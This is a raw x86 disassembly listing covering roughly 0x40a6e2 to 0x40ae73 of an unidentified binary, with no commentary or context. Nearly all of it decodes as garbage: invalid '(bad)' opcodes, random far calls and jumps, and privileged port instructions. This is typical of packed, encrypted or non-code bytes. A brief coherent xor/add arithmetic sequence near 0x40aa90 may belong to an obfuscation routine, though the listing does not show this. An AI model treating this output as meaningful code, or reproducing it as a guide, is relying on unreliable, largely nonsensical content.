  40a6e2:	xor    DWORD PTR [edi-0x23],ecx
  40a6e5:	call   0x42145f1
  40a6ea:	or     al,0x7c
  40a6ec:	mov    bl,0xd0
  40a6ee:	dec    ebx
  40a6ef:	dec    esi
  40a6f0:	pop    edi
  40a6f1:	and    al,dh
  40a6f3:	js     0x40a76c
  40a6f5:	jg     0x40a72b
  40a6f7:	(bad)  
  40a6f8:	scas   al,BYTE PTR es:[edi]
  40a6f9:	cs pop ebx
  40a6fb:	cmp    BYTE PTR [ebx+0x4b],ch
  40a6fe:	cdq    
  40a6ff:	test   DWORD PTR ss:[ebp+eax*2-0x48c4a614],0x968c81ad
  40a70b:	imul   eax,DWORD PTR [ebx+0x71c7aa20],0x41
  40a712:	mov    cl,0x6b
  40a714:	mov    DWORD PTR [ecx-0x4a],ebx
  40a717:	sub    dl,ah
  40a719:	xchg   edi,eax
  40a71a:	(bad)  
  40a71b:	cwde   
  40a71c:	xor    eax,0x541f97e7
  40a721:	fild   QWORD PTR [ecx-0x78]
  40a724:	jp     0x40a798
  40a726:	jecxz  0x40a700
  40a728:	inc    esp
  40a729:	adc    BYTE PTR [ecx+0x71],bh
  40a72c:	sbb    eax,0xbdcb8228
  40a731:	push   esi
  40a732:	sub    dh,BYTE PTR [esi+0x15a0d3]
  40a738:	arpl   WORD PTR ds:0x94928fb7,sp
  40a73e:	test   eax,0x6893a664
  40a743:	mov    al,ds:0xdfe71bb7
  40a748:	add    ebp,eax
  40a74a:	dec    esp
  40a74b:	in     eax,0x6a
  40a74d:	dec    BYTE PTR [ecx]
  40a74f:	in     eax,dx
  40a750:	imul   esi,DWORD PTR [eax],0xffffffed
  40a753:	fwait
  40a754:	aam    0xd
  40a756:	mov    dl,0x32
  40a758:	inc    edi
  40a759:	jbe    0x40a756
  40a75b:	mov    BYTE PTR [esi-0x4ab7e94a],ah
  40a761:	mov    bl,0x69
  40a763:	ss mov eax,0xecc86cc0
  40a769:	stos   DWORD PTR es:[edi],eax
  40a76a:	shr    ch,cl
  40a76c:	retf   0xd59d
  40a76f:	mov    WORD PTR ds:0xcc79d737,?
  40a775:	mov    ch,0x8b
  40a777:	fisub  WORD PTR [esi+0x7d]
  40a77a:	hlt    
  40a77b:	mov    esp,0xc4c6a1b6
  40a780:	push   esp
  40a781:	(bad)  
  40a782:	xor    al,0xcd
  40a784:	mov    ss,WORD PTR [esi-0x52]
  40a787:	mov    ebp,0x1a87ac3d
  40a78c:	pop    es
  40a78d:	mov    ds:0xd6723082,eax
  40a792:	in     eax,0xc2
  40a794:	test   BYTE PTR ds:0xc149328d,0xb
  40a79b:	inc    edi
  40a79c:	sbb    DWORD PTR [eax-0x43],ecx
  40a79f:	cmp    bl,dl
  40a7a1:	int3   
  40a7a2:	sbb    ecx,0x576307fc
  40a7a8:	jl     0x40a73a
  40a7aa:	push   cs
  40a7ab:	into   
  40a7ac:	retf   
  40a7ad:	pop    ebx
  40a7ae:	push   es
  40a7af:	or     edx,DWORD PTR [ebx+0xe]
  40a7b2:	or     ecx,DWORD PTR [eax]
  40a7b4:	ret    0x4286
  40a7b7:	into   
  40a7b8:	dec    ecx
  40a7b9:	add    bl,BYTE PTR [ecx-0xf]
  40a7bc:	mov    eax,0x65b16ca4
  40a7c1:	and    al,0xa1
  40a7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7c4:	(bad)  
  40a7c5:	mov    ecx,0x4f473a23
  40a7ca:	or     ah,BYTE PTR [ebx+0x40]
  40a7cd:	hlt    
  40a7ce:	leave  
  40a7cf:	and    DWORD PTR [edi+0x3f5a6b53],esi
  40a7d5:	jl     0x40a811
  40a7d7:	leave  
  40a7d8:	adc    BYTE PTR [ebx],ah
  40a7da:	retf   
  40a7db:	and    BYTE PTR [ebx+0x8],dl
  40a7de:	push   esi
  40a7df:	add    DWORD PTR ds:0x3b61b760,esp
  40a7e5:	repnz and DWORD PTR [ebx],edx
  40a7e8:	pop    ss
  40a7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7ea:	pop    ss
  40a7eb:	popf   
  40a7ec:	in     eax,0xdc
  40a7ee:	out    0x22,eax
  40a7f0:	je     0x40a800
  40a7f2:	stos   DWORD PTR es:[edi],eax
  40a7f3:	mov    dh,0xf4
  40a7f5:	cld    
  40a7f6:	cmp    ebx,edi
  40a7f8:	pusha  
  40a7f9:	(bad)  
  40a7fa:	push   edi
  40a7fb:	cmc    
  40a7fc:	add    BYTE PTR [esi-0x69a49a3],bl
  40a802:	sub    bh,bl
  40a804:	sbb    al,0xee
  40a806:	ss (bad) 
  40a808:	jp     0x40a7fd
  40a80a:	sbb    ecx,ebx
  40a80c:	cmc    
  40a80d:	dec    esi
  40a80e:	test   BYTE PTR [ebx],bh
  40a810:	mov    edx,0x3b36ba50
  40a815:	into   
  40a816:	mov    edx,0x8e6dc5c9
  40a81b:	shr    DWORD PTR [edx+0x2fd0996b],0x14
  40a822:	xor    eax,0x6084870c
  40a827:	fwait
  40a828:	mul    dl
  40a82a:	sbb    eax,0x2e2281af
  40a82f:	push   0xa6400ccd
  40a834:	dec    eax
  40a835:	fimul  DWORD PTR [edx-0x56]
  40a838:	add    ecx,edx
  40a83a:	(bad)  
  40a83b:	xchg   esp,eax
  40a83c:	adc    cl,bl
  40a83e:	or     ch,bh
  40a840:	rcr    DWORD PTR [esi-0x27fc1db3],cl
  40a846:	cmp    al,0x65
  40a848:	xlat   BYTE PTR ds:[ebx]
  40a849:	cmp    eax,0x9da5bfab
  40a84e:	call   0xf9f5:0xbde92940
  40a855:	pusha  
  40a856:	inc    ebp
  40a857:	xor    BYTE PTR [ecx],dh
  40a859:	xor    al,0x4f
  40a85b:	fs mov cl,0x5b
  40a85e:	and    dl,BYTE PTR [edx-0x5c7ecc08]
  40a864:	scas   al,BYTE PTR es:[edi]
  40a865:	(bad)  
  40a866:	sub    al,0x26
  40a868:	fwait
  40a869:	jo     0x40a7f6
  40a86b:	add    eax,0x991e7537
  40a870:	xchg   ebp,eax
  40a871:	test   al,0x7
  40a873:	cmp    BYTE PTR [ebx+0xb],ah
  40a876:	and    dl,bh
  40a878:	and    al,0x26
  40a87a:	inc    ebp
  40a87b:	adc    dl,ah
  40a87d:	cld    
  40a87e:	pop    ds
  40a87f:	jne    0x40a89b
  40a881:	cld    
  40a882:	gs adc eax,0xc98a60dc
  40a888:	bound  ecx,QWORD PTR [ecx-0x79]
  40a88b:	mov    ah,0x2b
  40a88d:	dec    esi
  40a88e:	cmp    dl,BYTE PTR [ebp+0x9cbe30b]
  40a894:	or     DWORD PTR [eax-0x2c],edi
  40a897:	ins    DWORD PTR es:[edi],dx
  40a898:	mov    ds:0x90071ab7,eax
  40a89d:	and    al,0xbf
  40a89f:	outs   dx,DWORD PTR ds:[esi]
  40a8a0:	inc    ecx
  40a8a1:	adc    al,0x87
  40a8a3:	shl    eax,1
  40a8a5:	sbb    ch,dl
  40a8a7:	arpl   WORD PTR [ecx],sp
  40a8a9:	pusha  
  40a8aa:	xchg   esi,eax
  40a8ab:	loope  0x40a913
  40a8ad:	daa    
  40a8ae:	imul   edx,ebx,0xe
  40a8b1:	addr16 and eax,0xe1a6c0d1
  40a8b7:	mov    eax,ds:0x29b85f05
  40a8bc:	push   esp
  40a8bd:	stos   BYTE PTR es:[edi],al
  40a8be:	mov    DWORD PTR [edx],ecx
  40a8c0:	call   0x9bf1e3ea
  40a8c5:	xor    BYTE PTR [ecx],cl
  40a8c7:	out    dx,eax
  40a8c8:	dec    esp
  40a8c9:	push   edx
  40a8ca:	mov    WORD PTR [ebx+0x38],fs
  40a8cd:	pop    ebx
  40a8ce:	push   cs
  40a8cf:	mov    ebx,0xeae1c639
  40a8d4:	or     BYTE PTR [ecx+0x2a],cl
  40a8d7:	sub    BYTE PTR [edi+0x28],dh
  40a8da:	cdq    
  40a8db:	sar    esp,0x96
  40a8de:	cmp    BYTE PTR [esi],dh
  40a8e0:	shl    BYTE PTR [ebp+0x6f],cl
  40a8e3:	and    DWORD PTR ds:0xe4f30b34,eax
  40a8e9:	fs mov dl,0x62
  40a8ec:	call   0x8b1ea055
  40a8f1:	in     al,dx
  40a8f2:	aad    0x69
  40a8f4:	je     0x40a911
  40a8f6:	in     eax,dx
  40a8f7:	int    0x81
  40a8f9:	xchg   DWORD PTR [ecx-0x77ddc3bf],eax
  40a8ff:	imul   edx,DWORD PTR [eax+0xc],0xffa10922
  40a906:	rcr    ah,1
  40a908:	push   ebp
  40a909:	scas   eax,DWORD PTR es:[edi]
  40a90a:	retf   0x8a6
  40a90d:	fistp  DWORD PTR [edx+ebp*2-0x562db82e]
  40a914:	loope  0x40a8fd
  40a916:	lahf   
  40a917:	pop    esi
  40a918:	pushf  
  40a919:	xchg   edi,eax
  40a91a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a91b:	mov    ch,0x7e
  40a91d:	fwait
  40a91e:	jne    0x40a950
  40a920:	push   eax
  40a921:	xchg   esp,eax
  40a922:	jb     0x40a921
  40a924:	jge    0x40a8d1
  40a926:	shr    DWORD PTR [edx-0x67d512c9],1
  40a92c:	push   0xffffffae
  40a92e:	enter  0xf5d0,0x27
  40a932:	sub    al,0xd8
  40a934:	js     0x40a910
  40a936:	(bad)  
  40a937:	and    esp,DWORD PTR [esi-0x3a806866]
  40a93d:	lods   al,BYTE PTR ds:[esi]
  40a93e:	ja     0x40a98c
  40a940:	loope  0x40a923
  40a942:	dec    ebp
  40a943:	adc    ch,BYTE PTR [edi]
  40a945:	xchg   esi,eax
  40a946:	push   ebp
  40a947:	push   esp
  40a948:	xor    BYTE PTR [esi+ecx*2],bh
  40a94b:	es scas al,BYTE PTR es:[edi]
  40a94d:	or     esi,DWORD PTR [ecx-0x4a]
  40a950:	pop    ebx
  40a951:	or     ah,BYTE PTR [ebp-0x249fa542]
  40a957:	sbb    cl,BYTE PTR [edi]
  40a959:	xchg   DWORD PTR [ecx],edx
  40a95b:	pop    ecx
  40a95c:	pop    ebx
  40a95d:	mov    edi,0x35262971
  40a962:	loope  0x40a954
  40a964:	sub    bl,BYTE PTR [esi]
  40a966:	fidivr DWORD PTR [ecx+edi*4+0x28]
  40a96a:	neg    DWORD PTR [eax+edi*8-0xa]
  40a96e:	mul    bl
  40a970:	cmc    
  40a971:	test   BYTE PTR [ecx+0x5d],bh
  40a974:	mov    ds:0xa0de83ab,eax
  40a979:	pop    ds
  40a97a:	dec    esp
  40a97b:	xor    eax,0xcad4a789
  40a980:	adc    DWORD PTR [ebx-0x5bf9fc38],0x6b
  40a987:	ja     0x40a948
  40a989:	or     ebp,DWORD PTR [esi]
  40a98b:	popf   
  40a98c:	shl    BYTE PTR [ebx+0x71d3686c],0xa2
  40a993:	je     0x40a947
  40a995:	ss inc esp
  40a997:	mov    DWORD PTR [ebp+esi*4-0xd7cfc3c],esp
  40a99e:	pusha  
  40a99f:	enter  0xef1d,0x6
  40a9a3:	and    dl,cl
  40a9a5:	fisub  DWORD PTR [edx+esi*4-0xc4d364f]
  40a9ac:	div    ebp
  40a9ae:	imul   ecx,DWORD PTR ss:[ebx+0xdde62a3],0xc9b75a16
  40a9b9:	xchg   esi,eax
  40a9ba:	cs cmp eax,0xa3f18814
  40a9c0:	inc    esi
  40a9c1:	push   eax
  40a9c2:	jmp    FWORD PTR [edx+0xff91e58]
  40a9c8:	xor    al,cl
  40a9ca:	sub    al,0xd1
  40a9cc:	inc    ecx
  40a9cd:	(bad)  
  40a9ce:	fiadd  WORD PTR [ebx+0x2144274a]
  40a9d4:	mov    eax,0x64eee44c
  40a9d9:	or     al,0x2f
  40a9db:	jae    0x40a979
  40a9dd:	jne    0x40a9bd
  40a9df:	jmp    0xeda755b2
  40a9e4:	fsubr  DWORD PTR [edi-0x7f917559]
  40a9ea:	push   esp
  40a9eb:	and    BYTE PTR [edx],al
  40a9ed:	outs   dx,DWORD PTR ds:[esi]
  40a9ee:	push   0x5d
  40a9f0:	mov    BYTE PTR [ecx+ebx*4+0x48ef58aa],cl
  40a9f7:	test   al,0x78
  40a9f9:	ror    BYTE PTR [eax],0x8e
  40a9fc:	add    bh,BYTE PTR [ebx+0x3f5ce718]
  40aa02:	popf   
  40aa03:	dec    eax
  40aa04:	fcmovbe st,st(4)
  40aa06:	ror    BYTE PTR [eax-0x4e],1
  40aa09:	mov    esi,0x9c45c625
  40aa0e:	sub    DWORD PTR [ecx+0x1c48fd34],0x88c71474
  40aa18:	jmp    0xfc7b8b4f
  40aa1d:	xor    al,0x25
  40aa1f:	mov    bl,0x8
  40aa21:	xchg   edi,eax
  40aa22:	fadd   QWORD PTR [esi+0x54e16511]
  40aa28:	repz xchg edx,eax
  40aa2a:	imul   edx,DWORD PTR [edi-0x58],0xffffffdb
  40aa2e:	xchg   esi,eax
  40aa2f:	sbb    eax,0x369f7c3
  40aa34:	outs   dx,BYTE PTR ds:[esi]
  40aa35:	xchg   al,dh
  40aa37:	xchg   esp,eax
  40aa38:	adc    edi,DWORD PTR [eax*8-0x53d1e1b0]
  40aa3f:	sti    
  40aa40:	in     al,dx
  40aa41:	jge    0x40aa46
  40aa43:	push   0x80b0dad3
  40aa48:	inc    eax
  40aa49:	(bad)  
  40aa4a:	xor    eax,0x8906e05
  40aa4f:	retf   
  40aa50:	daa    
  40aa51:	inc    esi
  40aa52:	pop    ebp
  40aa53:	push   cs
  40aa54:	cmc    
  40aa55:	adc    al,0x7a
  40aa57:	xor    eax,0x324f68c0
  40aa5c:	add    eax,0x7976079f
  40aa61:	nop
  40aa62:	jo     0x40aa46
  40aa64:	cwde   
  40aa65:	hlt    
  40aa66:	push   ds
  40aa67:	ss cwde 
  40aa69:	jb     0x40a9f5
  40aa6b:	mov    eax,ds:0x3837a5c0
  40aa70:	in     eax,0x84
  40aa72:	cmp    eax,0x9f9e5f99
  40aa77:	jae    0x40aacf
  40aa79:	fimul  WORD PTR [edi+0x33]
  40aa7c:	add    al,0x5e
  40aa7e:	cdq    
  40aa7f:	aad    0xbd
  40aa81:	mov    al,ds:0x5b4e0256
  40aa86:	mov    bl,0x51
  40aa88:	lahf   
  40aa89:	or     al,dl
  40aa8b:	inc    edx
  40aa8c:	nop
  40aa8d:	gs out 0x24,al
  40aa90:	xor    eax,ecx
  40aa92:	mov    edx,0x3272db
  40aa97:	add    eax,edx
  40aa99:	mov    DWORD PTR [ebp+0x8],eax
  40aa9c:	mov    eax,DWORD PTR [ebp-0x14]
  40aa9f:	xor    eax,ecx
  40aaa1:	add    eax,edx
  40aaa3:	mov    edx,DWORD PTR [ebp+0x14]
  40aaa6:	imul   eax,DWORD PTR [edx]
  40aaa9:	mov    edx,DWORD PTR [ebp-0x4]
  40aaac:	xor    edx,ecx
  40aaae:	mov    ecx,DWORD PTR [ebp+0x8]
  40aab1:	lea    ecx,[edx+ecx*1+0x3272db]
  40aab8:	jmp    0x40ce47
  40aabd:	inc    esi
  40aabe:	outs   dx,DWORD PTR ds:[esi]
  40aabf:	mov    esp,0x5a393f3
  40aac4:	outs   dx,DWORD PTR ds:[esi]
  40aac5:	rcl    bl,cl
  40aac7:	mov    edx,0x8c74a0bc
  40aacc:	andps  xmm6,xmm4
  40aacf:	bound  esp,QWORD PTR [edx+0x10]
  40aad2:	pop    edi
  40aad3:	bound  esp,QWORD PTR [edx-0xc]
  40aad6:	popf   
  40aad7:	dec    edx
  40aad8:	imul   ecx,DWORD PTR [eax-0x2e23b067],0x4493c7f7
  40aae2:	or     BYTE PTR [edi*4-0x75d4d08c],bh
  40aae9:	test   DWORD PTR [edi+ecx*2],esi
  40aaec:	mov    ebx,0x4c145573
  40aaf1:	sbb    BYTE PTR [edx+0xb40812],bl
  40aaf7:	mov    edx,0xbf5a2ab
  40aafc:	stos   BYTE PTR es:[edi],al
  40aafd:	add    ebx,DWORD PTR [esi]
  40aaff:	push   0x917c4a27
  40ab04:	xlat   BYTE PTR ds:[ebx]
  40ab05:	dec    esp
  40ab06:	enter  0x6d1,0x28
  40ab0a:	pop    ecx
  40ab0b:	mov    ebx,0xa72f4307
  40ab10:	popf   
  40ab11:	cmp    BYTE PTR [ecx+0x1e2ace65],dl
  40ab17:	jo     0x40ab35
  40ab19:	add    al,0x1b
  40ab1b:	push   ebx
  40ab1c:	mov    dh,0x0
  40ab1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab1f:	es cmp al,0x4c
  40ab22:	aaa    
  40ab23:	mov    edx,0x57052622
  40ab28:	clc    
  40ab29:	jp     0x40ab6b
  40ab2b:	push   0xfdba2ac3
  40ab30:	jmp    0x40ab88
  40ab32:	xchg   esp,eax
  40ab33:	jb     0x40ab3a
  40ab35:	add    eax,0xdf3e98ea
  40ab3a:	xchg   DWORD PTR [ebx-0xa],ebx
  40ab3d:	sub    eax,0x95c330c6
  40ab42:	push   esi
  40ab43:	repz inc edx
  40ab45:	retf   0xc460
  40ab48:	and    eax,0x78ea4ced
  40ab4d:	inc    ebp
  40ab4e:	adc    ebx,DWORD PTR [esp+ebx*2+0x2c]
  40ab52:	daa    
  40ab53:	or     BYTE PTR [edi+edx*4+0x678ab673],0x9
  40ab5b:	inc    ecx
  40ab5c:	lea    esi,[esi]
  40ab5e:	inc    edx
  40ab5f:	call   0x2ebd634f
  40ab64:	(bad)  
  40ab65:	aad    0xb5
  40ab67:	dec    esp
  40ab68:	pop    ds
  40ab69:	inc    eax
  40ab6a:	icebp  
  40ab6b:	mov    bl,0x6a
  40ab6d:	add    BYTE PTR [ebp+0x6],bl
  40ab70:	push   eax
  40ab71:	daa    
  40ab72:	sbb    eax,0xf0f79eee
  40ab77:	cmp    BYTE PTR [edi+edi*1+0x7e],al
  40ab7b:	pop    ds
  40ab7c:	xchg   esp,eax
  40ab7d:	int3   
  40ab7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab7f:	test   eax,0xbbc788c6
  40ab84:	nop
  40ab85:	add    ebp,edx
  40ab87:	xor    al,0xa2
  40ab89:	cwde   
  40ab8a:	adc    DWORD PTR [ebp-0x31],edx
  40ab8d:	inc    ebx
  40ab8e:	mov    ss,edx
  40ab90:	cmp    BYTE PTR [edx+0x54],dh
  40ab93:	dec    ebp
  40ab94:	pop    ebx
  40ab95:	ret    
  40ab96:	ror    dh,cl
  40ab98:	lds    ebx,FWORD PTR ds:[esi+0x7ac0a639]
  40ab9f:	mov    edi,0xfb0b7982
  40aba4:	dec    ebx
  40aba5:	mov    bl,0xdb
  40aba7:	inc    esi
  40aba8:	xchg   bl,ch
  40abaa:	inc    edx
  40abab:	dec    ebx
  40abac:	mov    bh,0xb0
  40abae:	or     dh,BYTE PTR [ecx]
  40abb0:	mov    sp,0x4ec7
  40abb4:	test   DWORD PTR [eax],ecx
  40abb6:	jns    0x40abb6
  40abb8:	xor    eax,0x9a5152a7
  40abbd:	sbb    al,0x10
  40abbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abc0:	add    eax,0x1010872d
  40abc5:	shr    BYTE PTR [ecx+0x29361d22],0x88
  40abcc:	(bad)  
  40abcd:	and    eax,0x2f85d25b
  40abd2:	sbb    al,0x19
  40abd4:	aas    
  40abd5:	lea    edx,[edi+0x35]
  40abd8:	xchg   esi,eax
  40abd9:	or     eax,0x1cbe2c9b
  40abde:	jge    0x40ac4d
  40abe0:	xor    BYTE PTR [ecx+edi*1],al
  40abe3:	mov    dh,0xde
  40abe5:	cmc    
  40abe6:	inc    ecx
  40abe7:	call   0x373b4d6a
  40abec:	mov    eax,0xc1c176d2
  40abf1:	fist   DWORD PTR [eax]
  40abf3:	mov    WORD PTR [ebp-0x4c3bde56],es
  40abf9:	leave  
  40abfa:	scas   al,BYTE PTR es:[edi]
  40abfb:	inc    ecx
  40abfc:	pop    edi
  40abfd:	in     al,dx
  40abfe:	rcr    DWORD PTR [edx-0x7cae67d9],cl
  40ac04:	mov    ebx,0x7ed0fa5c
  40ac09:	sbb    BYTE PTR [eax+0x1c],al
  40ac0c:	out    dx,eax
  40ac0d:	cs pop edi
  40ac0f:	xor    al,0x36
  40ac11:	imul   esi,DWORD PTR [edx-0x2d775f41],0xffffffdd
  40ac18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac19:	push   ds
  40ac1a:	in     al,dx
  40ac1b:	lock fnstenv [esi+0x20]
  40ac1f:	fist   WORD PTR [eax-0x24]
  40ac22:	retf   0xe29d
  40ac25:	das    
  40ac26:	and    esp,DWORD PTR [ecx-0x14]
  40ac29:	add    eax,0xd2d7826f
  40ac2e:	scas   al,BYTE PTR es:[edi]
  40ac2f:	mov    bh,0x76
  40ac31:	jmp    0x40ac88
  40ac33:	jne    0x40abd5
  40ac35:	fwait
  40ac36:	mov    edx,0x173d5c9a
  40ac3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac3c:	mov    ah,0xbd
  40ac3e:	and    BYTE PTR [edi+0x65],bh
  40ac41:	cmp    al,0x12
  40ac43:	sbb    BYTE PTR [eax],0x4c
  40ac46:	mov    ds:0xd23778e1,al
  40ac4b:	mov    edi,0xc286775b
  40ac50:	call   0x60fc9360
  40ac55:	call   0x8a7c0550
  40ac5a:	mov    cl,0x9c
  40ac5c:	inc    edi
  40ac5d:	and    al,0x55
  40ac5f:	pop    edx
  40ac60:	gs inc ebx
  40ac62:	ror    DWORD PTR [edi+0x4],1
  40ac65:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac67:	mov    bh,0xce
  40ac69:	imul   esp,DWORD PTR [eax-0x33a1c9e8],0xffffff86
  40ac70:	mov    eax,0x23eaaa16
  40ac75:	push   cs
  40ac76:	and    eax,0x7346942e
  40ac7b:	and    bh,0xb7
  40ac7e:	jg     0x40ac23
  40ac80:	cmc    
  40ac81:	shl    BYTE PTR [esi],0xf6
  40ac84:	es xchg edx,eax
  40ac86:	cmp    DWORD PTR [ecx],0xffffff83
  40ac89:	cmp    BYTE PTR [edx-0x4f],bl
  40ac8c:	icebp  
  40ac8d:	add    ebx,DWORD PTR [edx+0x3af54a72]
  40ac93:	cmp    DWORD PTR [eax+esi*1],0xd4193e54
  40ac9a:	cmp    ebp,DWORD PTR [edi-0x68]
  40ac9d:	cmp    BYTE PTR [ebp+ebx*8-0x49],0xfe
  40aca2:	lods   eax,DWORD PTR ds:[esi]
  40aca3:	sub    ebx,DWORD PTR [edx+0x2d]
  40aca6:	sbb    edx,ebx
  40aca8:	mov    bl,0xca
  40acaa:	arpl   WORD PTR [ebx-0x3b],cx
  40acad:	loopne 0x40ac4c
  40acaf:	pop    ebp
  40acb0:	clc    
  40acb1:	push   cs
  40acb2:	aam    0x10
  40acb4:	call   0xaf75:0xd9cf3ad0
  40acbb:	jbe    0x40ac79
  40acbd:	mov    al,ds:0x893f576c
  40acc2:	cld    
  40acc3:	imul   esi,DWORD PTR [esi-0x50296c8e],0xb6522c48
  40accd:	lock sbb DWORD PTR [ecx+0xa2a175],esi
  40acd4:	dec    esp
  40acd5:	daa    
  40acd6:	push   0xffffffc6
  40acd8:	iret   
  40acd9:	lock je 0x40ad4f
  40acdc:	aas    
  40acdd:	inc    ebp
  40acde:	add    DWORD PTR [eax],eax
  40ace0:	in     eax,dx
  40ace1:	(bad)  
  40ace2:	sbb    al,0xde
  40ace4:	jns    0x40aced
  40ace6:	jns    0x40aceb
  40ace8:	xchg   ecx,eax
  40ace9:	xlat   BYTE PTR ds:[ebx]
  40acea:	adc    ah,ch
  40acec:	js     0x40ad66
  40acee:	inc    ebp
  40acef:	mov    eax,ds:0x55a2554e
  40acf4:	push   eax
  40acf5:	push   ds
  40acf6:	fwait
  40acf7:	push   esi
  40acf8:	int    0xdb
  40acfa:	or     ebp,DWORD PTR ss:[eax-0x7b5d36af]
  40ad01:	or     DWORD PTR [ecx+0x74],edi
  40ad04:	loopne 0x40ac88
  40ad06:	or     al,0xd1
  40ad08:	add    DWORD PTR es:[esi],ebp
  40ad0b:	inc    ebp
  40ad0c:	xchg   esp,eax
  40ad0d:	in     al,0x56
  40ad0f:	cs clc 
  40ad11:	rol    ebx,1
  40ad13:	xchg   DWORD PTR [edx+0x36],esi
  40ad16:	mov    ebp,0x4f204b9c
  40ad1b:	push   es
  40ad1c:	fistp  DWORD PTR [edx+0x3237ae97]
  40ad22:	sbb    BYTE PTR [esi-0x62f1b9e7],bh
  40ad28:	rol    BYTE PTR [ebp-0x617d4f8d],cl
  40ad2e:	ror    BYTE PTR [eax-0x5d],0x44
  40ad32:	clc    
  40ad33:	aas    
  40ad34:	jae    0x40acb9
  40ad36:	jmp    0x40ad87
  40ad38:	retf   0x56d
  40ad3b:	inc    ecx
  40ad3c:	sub    al,0x4c
  40ad3e:	xchg   esp,eax
  40ad3f:	cmp    BYTE PTR [ebx],ah
  40ad41:	dec    eax
  40ad42:	jae    0x60123a32
  40ad48:	jae    0x40ad0a
  40ad4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad4b:	lock bound ebx,QWORD PTR [edi]
  40ad4e:	int    0x82
  40ad50:	test   DWORD PTR [edi],ebp
  40ad52:	ins    BYTE PTR es:[edi],dx
  40ad53:	mov    bh,0x13
  40ad55:	jmp    0x963117ed
  40ad5a:	fsubr  QWORD PTR [ebp-0x1d]
  40ad5d:	xchg   ebp,eax
  40ad5e:	add    BYTE PTR ds:0x44a6a2e3,ah
  40ad64:	scas   eax,DWORD PTR es:[edi]
  40ad65:	stos   DWORD PTR es:[edi],eax
  40ad66:	(bad)  
  40ad67:	ins    BYTE PTR es:[edi],dx
  40ad68:	pop    eax
  40ad69:	jg     0x40ad96
  40ad6b:	inc    edi
  40ad6c:	imul   edx,esi,0xffffffd9
  40ad6f:	inc    edx
  40ad70:	cli    
  40ad71:	stos   DWORD PTR es:[edi],eax
  40ad72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad73:	sub    esi,DWORD PTR [esp+eax*1+0x13]
  40ad77:	pop    eax
  40ad78:	mov    esp,0xb3eaf4aa
  40ad7d:	mov    esp,DWORD PTR [ecx+ebx*4-0x47583d37]
  40ad84:	mov    ecx,0xd1a6ff66
  40ad89:	fdiv   st,st(0)
  40ad8b:	mov    cl,0x22
  40ad8d:	or     cl,bl
  40ad8f:	mov    eax,ds:0x482a16c8
  40ad94:	push   ds
  40ad95:	scas   al,BYTE PTR es:[edi]
  40ad96:	sti    
  40ad97:	ret    
  40ad98:	ret    0x8338
  40ad9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad9c:	cmp    bl,ch
  40ad9e:	and    BYTE PTR [edx+0x2ee96801],dl
  40ada4:	dec    edx
  40ada5:	jg     0x40ad30
  40ada7:	sbb    BYTE PTR [eax-0x22b432d7],dh
  40adad:	(bad)  
  40adae:	xchg   edi,eax
  40adaf:	stos   BYTE PTR es:[edi],al
  40adb0:	stc    
  40adb1:	and    edi,edi
  40adb3:	out    0x7e,eax
  40adb5:	out    dx,eax
  40adb6:	cwde   
  40adb7:	repz jl 0x40ad3d
  40adba:	push   0xe08819bb
  40adbf:	pop    esi
  40adc0:	es jge 0x40ad7d
  40adc3:	and    BYTE PTR [edi-0x22fc1179],ah
  40adc9:	(bad)  
  40adca:	dec    ebp
  40adcb:	not    bl
  40adcd:	xor    eax,0x92899a4b
  40add2:	(bad)  
  40add3:	cmp    esi,DWORD PTR [edi]
  40add5:	pop    edi
  40add6:	test   al,ah
  40add8:	(bad)  
  40add9:	xor    eax,0x4d56230d
  40adde:	jge    0x40ad62
  40ade0:	fs (bad) 
  40ade2:	(bad)  
  40ade3:	mov    edi,0x378ed5ec
  40ade8:	mov    esp,0x379b0e25
  40aded:	imul   ebp,edx,0x7
  40adf0:	xchg   esp,eax
  40adf1:	in     al,dx
  40adf2:	or     eax,0xe2452a1d
  40adf7:	(bad)  
  40adf8:	push   ss
  40adf9:	test   al,0xa8
  40adfb:	pop    ecx
  40adfc:	shl    DWORD PTR [eax-0x291becfb],cl
  40ae02:	push   ss
  40ae03:	xchg   edx,eax
  40ae04:	stos   BYTE PTR es:[edi],al
  40ae05:	jge    0x40ae41
  40ae07:	(bad)  
  40ae08:	mov    ebx,0x3385bf2c
  40ae0d:	rcl    ah,1
  40ae0f:	cs mov eax,0x289feb93
  40ae15:	das    
  40ae16:	push   ebp
  40ae17:	leave  
  40ae18:	test   eax,0xedfa28b8
  40ae1d:	or     BYTE PTR [ecx+0x23],0xa2
  40ae21:	gs mov ecx,0x7a96227
  40ae27:	ins    BYTE PTR es:[edi],dx
  40ae28:	icebp  
  40ae29:	daa    
  40ae2a:	cmp    DWORD PTR [esi],ebp
  40ae2c:	out    dx,eax
  40ae2d:	enter  0x54ed,0x73
  40ae31:	dec    eax
  40ae32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae33:	adc    eax,0x7c63c013
  40ae38:	jae    0x40aeae
  40ae3a:	test   DWORD PTR [eax-0x1f],0xfa978c5
  40ae41:	lock scas al,BYTE PTR es:[edi]
  40ae43:	push   cs
  40ae44:	inc    ebx
  40ae45:	adc    ch,BYTE PTR [ebp+0x2f0100b4]
  40ae4b:	sub    DWORD PTR [ebp-0x4980de44],esi
  40ae51:	xor    dh,BYTE PTR [ebx-0x20]
  40ae54:	add    DWORD PTR [ebx+0x29c1a177],0x244f68f
  40ae5e:	call   0x6cd6:0x9b9a5bb6
  40ae65:	mov    ebp,edi
  40ae67:	xchg   esp,eax
  40ae68:	add    al,0x25
  40ae6a:	in     al,dx
  40ae6b:	adc    ebp,DWORD PTR [esi-0x31]
  40ae6e:	mov    bl,0x76
  40ae70:	xchg   ebp,eax
  40ae71:	stos   DWORD PTR es:[edi],eax
  40ae72:	(bad)  
  40ae73:	fs cmp eax,0x23c6a850
